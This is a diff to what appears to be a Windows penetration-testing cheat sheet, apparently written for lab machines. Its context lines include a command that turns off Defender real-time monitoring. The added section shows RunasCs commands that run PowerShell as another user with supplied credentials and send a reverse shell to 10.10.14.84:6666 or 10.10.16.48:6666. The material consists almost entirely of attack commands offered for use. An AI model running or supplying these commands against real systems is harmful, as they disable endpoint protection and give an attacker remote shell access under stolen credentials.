@@ -213,3 +213,10 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 net accounts
 ```
+## RunAsCs - runas user
+```
+# run as <USER>, useful if the user is not in the REMOTE GROUP
+# upload RunasCs
+.\RunasCs.exe <USER> <PASSWORD>  powershell.exe -r 10.10.14.84:6666
+.\RunasCS.exe /user:<DOMAIN>\<USER> <PASS>  powershell.exe (-r 10.10.16.48:6666)
+```
